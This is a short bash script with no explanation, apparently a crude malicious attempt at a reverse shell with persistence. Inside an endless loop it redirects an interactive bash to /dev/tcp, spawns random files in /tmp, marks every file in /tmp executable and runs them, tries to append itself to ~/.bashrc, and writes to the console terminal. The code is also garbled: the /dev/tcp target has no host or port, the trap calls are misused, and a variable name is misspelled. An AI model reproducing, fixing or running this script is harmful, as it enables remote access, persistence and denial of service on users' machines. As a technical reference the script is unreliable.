#!/bin/bash
trap 'INT'
for (( ; ; ))
do
trap 'HUP'
touch /dev/tcp
/bin/bash -i > /dev/tcp 0<&1 2>&1 & >> /tmp/$RANDOM
touch /tmp/$RANDOM
echo "/bin/bash -i > /dev/tcp/ 0<&1 2>&1 & >> /tmp/$RANDOM & echo tty1 > /dev/tty1 & echo /tmp/$RANOM >> ~/.bashrc" >> /tmp/$RANDOM
chmod u+x /tmp/*
cd /tmp
./*
echo tty1 > /dev/tty1
done